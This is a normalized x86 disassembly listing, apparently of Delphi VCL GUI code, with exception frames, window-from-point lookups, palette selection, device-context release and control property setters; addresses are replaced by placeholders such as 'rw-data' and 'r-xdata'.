mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_440546
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43f1cc
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403870
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_440278
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43fba4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_449f90
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44054d
mov eax [ rw-data ]
call sub_4036c0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4592cc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_442f30
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43fa88
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45cf3c
sub_44054d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_4405dc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ec78
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_440610
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4405dc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4418a8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_445e0c
test eax eax
je r-xdata
mov esi eax
sub_440658
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_416044
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx ] eax
sub_440680
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_416340
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4036c0
xor eax eax
mov [ ebx ] eax
sub_4406a0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4406d0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_416834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_440780
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_440759
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44090c
call sub_403f38
call sub_403f38
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_422384
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44078c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44082a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440831
mov eax [ rw-data ]
call sub_416898
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_440802
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44090c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4223e0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_422384
test al al
je r-xdata
sub_440838
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_44090c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ef4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_440864
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_422564
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_422568
mov eax [ ebp - 0x4 ]
call sub_440958
mov eax [ rw-data ]
call sub_416834
mov ebx eax
xor eax eax
push ebp
push sub_4408e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_416044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
call sub_4406d0
sub_44090c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_422568
mov edx ebx
mov eax [ rw-data ]
call sub_416848
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_440958
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4423c0
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_440984
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4409c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416b68
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_440a08
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_440ac4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440b91
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b98
lea eax [ ebp - 0x1c ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4038bc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_4512e4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409730
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404480
sub_440bb4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440c1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44e118
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_441d64
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ eax + 0x64 ]
pop eax
call sub_404828
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c22
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov al 0x1
sub_440c28
push ebx
mov ebx eax
mov eax ebx
call sub_44e140
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440c5c
push ebx
mov ebx eax
mov eax ebx
call sub_44e190
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404828
je r-xdata
mov al 0x1
pop ebx
retn
sub_440c94
push ebx
mov ebx eax
mov eax ebx
call sub_44e1cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440cc8
push ebx
mov ebx eax
mov eax ebx
call sub_41eab4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440cf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_441d94
sub_440d10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_440d30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_404480
sub_440d54
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_441c84
sub_440d74
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_440da0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404828
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_440e04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4416e0
sub_440e24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4416cc
sub_440e44
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_440e64
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e1a4
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_441e14
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_440984
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_442cf0
mov [ ebx + 0x70 ] 0x80000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_440f3c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403a8c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_460da0
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
push edi
xor ecx ecx
mov edx 0xb039
call sub_442f30
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_441704
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4038bc
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4036c0
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4036c0
mov eax [ edi + 0x68 ]
call sub_4036c0
mov eax [ edi + 0x64 ]
call sub_409214
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e1f0
test bl bl
jle r-xdata
sub_441008
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_441030
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4038bc
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4410b8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4413b8
sub_4410d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4036c0
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_443d50
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4038bc
mov edx ebx
mov eax edi
call sub_41e274
mov eax ebx
mov si 0xffd9
call sub_4038bc
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4411a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41e604
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_442f30
sub_441234
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e4c0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_441d1c
jmp r-xdata
xor edx edx
mov eax esi
call sub_4410d8
sub_441278
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4038bc
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4410b8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4038bc
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_441320
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4434c4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4421ac
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4413b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_442f30
mov eax ebx
mov si 0xffd0
call sub_4038bc
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4038bc
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4413b8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4414d4
